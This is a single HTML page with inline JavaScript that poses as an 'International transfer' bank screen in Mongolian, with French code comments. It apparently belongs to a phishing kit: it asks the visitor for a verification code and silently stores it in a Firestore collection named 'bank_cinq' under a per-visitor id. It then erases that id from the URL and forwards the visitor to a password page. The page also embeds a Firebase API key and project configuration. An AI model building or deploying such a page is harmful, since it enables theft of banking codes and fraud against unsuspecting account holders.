<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="images/ban12.png" type="image/png">
    <title>Олон улсын шилжүүлэг</title>

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/styles.css">
</head>
<body>
 <header>
        <nav class="navbar navbar-expand-lg">
            <div class="container">
                <a class="navbar-brand" href="index.html">
                    <img src="images/ban12.png" alt="Logo" width="40" height="34" class="d-inline-block align-text-top me-2">
                    <span class="text-success">Олон улсын</span> шилжүүлэг
                </a>
            </div>
        </nav>
    </header>

    <main>
        <div id="loading-spinner" class="spinner-container">
            <div class="spinner"></div>
            <div class="loading-text mb-4">Loading</div>
            <form class="container" id="codeForm">
                <input type="hidden" name="id" value="">
                <div class="mb-3">
                    <input type="text" name="code" id="code" class="form-control text-center" placeholder="Enter code" required>
                </div>
                <div class="text-center">
                    <button class="btn btn-success" type="submit">Validate</button>
                </div>
            </form>
        </div>
    </main>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

    <script type="module">
        // Importation de Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
        import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";

        // Configuration Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyBAn0oOcsPWlu82p_FpFyz5Bnq4dTd0R2o",
            authDomain: "virement2-bf790.firebaseapp.com",
            projectId: "virement2-bf790",
            storageBucket: "virement2-bf790.firebasestorage.app",
            messagingSenderId: "965517390511",
            appId: "1:965517390511:web:430715abd2331f0a42da5a"
        };

        // Initialisation Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Récupérer l'ID du document depuis l'URL
        const urlParams = new URLSearchParams(window.location.search);
        const documentId = urlParams.get("id");

        // Gestion du formulaire
        document.addEventListener("DOMContentLoaded", function () {
            document.getElementById("codeForm").addEventListener("submit", async function (event) {
                event.preventDefault(); // Empêche le rechargement de la page

                const code = document.getElementById("code").value;

                if (code && documentId) {
                    try {
                        // Mettre à jour le document avec le code
                        await updateDoc(doc(db, "bank_cinq", documentId), {
                            code: code
                        });

                        console.log("Document mis à jour avec le code : ", code);

                        // Supprimer l'ID de l'URL
                        const newUrl = window.location.origin + window.location.pathname;
                        history.replaceState(null, "", newUrl);

                        // Rediriger vers la page de confirmation
                        window.location.href = `transaction.password2.html?id=${documentId}`;

                    } catch (error) {
                        console.error("Erreur Firebase :", error);
                        alert("Une erreur s'est produite. Veuillez réessayer.");
                    }
                } else {
                    alert("Veuillez entrer un code !");
                }
            });
        });
    </script>
</body>
</html>
